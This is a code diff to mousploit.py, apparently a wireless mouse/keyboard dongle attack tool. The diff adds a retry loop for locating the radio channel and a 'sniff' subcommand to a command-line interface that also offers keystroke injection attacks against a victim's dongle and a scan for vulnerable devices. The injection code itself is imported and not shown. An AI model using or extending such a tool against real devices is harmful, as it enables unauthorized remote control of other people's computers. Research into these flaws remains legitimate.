@@ -11,30 +11,34 @@ from utils.scan import *
 from utils.sniff import *
 from utils.live_mode import *
 
+NUM_RETRIES = 5 # number of allowed retries beyond which we give up finding the channel
+
 """
-usage: mousploit.py [-h] {attack,scan} ...
+usage: mousploit.py [-h] {attack,scan,sniff} ...
 
 options:
-  -h, --help     show this help message and exit
+  -h, --help           show this help message and exit
 
 required commands:
-  {attack,scan}  Select one of:
-    attack       Perform a keystroke injection attack against a specified target
-    scan         Scan for nearby vulnerable devices
+  {attack,scan,sniff}  Select one of:
+    attack             Perform a keystroke injection attack against a specified target
+    scan               Scan for nearby vulnerable devices
+    sniff              Sniff packets from a specific device
 
 commands usage:
 usage: mousploit.py attack [-h] [--address ADDRESS] (--string STRING | --script-file SCRIPT_FILE | --live-mode)
 usage: mousploit.py scan [-h] [--duration DURATION]
+usage: mousploit.py sniff [-h] [--address ADDRESS] [--duration DURATION]
 """
 def main():
     # initializing the argument parser
     parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
 
     # adding two commands
-    subparser = parser.add_subparsers(dest="command", title="required commands", help="Select one of:") # command can either be "attack" or "scan"
+    subparser = parser.add_subparsers(dest="command", title="required commands", help="Select one of:") # command can either be "attack", "scan" or "sniff"
     attack_cmd = subparser.add_parser("attack", help="Perform a keystroke injection attack against a specified target")
     scan_cmd = subparser.add_parser("scan", help="Scan for nearby vulnerable devices")
-    sniff_cmd = subparser.add_parser("sniff", help="Sniff packets from a specified device")
+    sniff_cmd = subparser.add_parser("sniff", help="Sniff packets from a specific device")
 
     # defining arguments for "attack"
     attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
@@ -49,7 +53,8 @@ def main():
     # arguments for sniff
     sniff_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
     sniff_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the sniffing process (in seconds)")
-    parser.epilog = f"""commands usage:\n{attack_cmd.format_usage()}{scan_cmd.format_usage()}""" # text added to the end of the help message (shown when using -h or calling parser.print_help())
+
+    parser.epilog = f"""commands usage:\n{attack_cmd.format_usage()}{scan_cmd.format_usage()}{sniff_cmd.format_usage()}""" # text added to the end of the help message (shown when using -h or calling parser.print_help())
     # parser.print_help()
     args = parser.parse_args() # parse the arguments
 
@@ -62,8 +67,13 @@ def main():
         # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
         radio_server.enter_sniffer_mode(address_str_to_bytes(args.address))
 
-        channel = find_frequency_channel(radio_server)
-        if not channel:
+        # try to find the channel within the limited number of allowed retries
+        found = False
+        for i in range(NUM_RETRIES):
+            if find_frequency_channel(radio_server):
+                found = True
+                break
+        if not found:
             print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
             sys.exit(1)
 
@@ -82,7 +92,7 @@ def main():
         scan(radio_server, args.duration)
 
     elif args.command == "sniff":
-        print(f"Sniffing packets from the target keyboard with address: {args.address}")
+        print(f"Sniffing packets from the target device with address: {args.address}")
         sniff(radio_server, args.address, args.duration)
 
 if __name__ == "__main__":
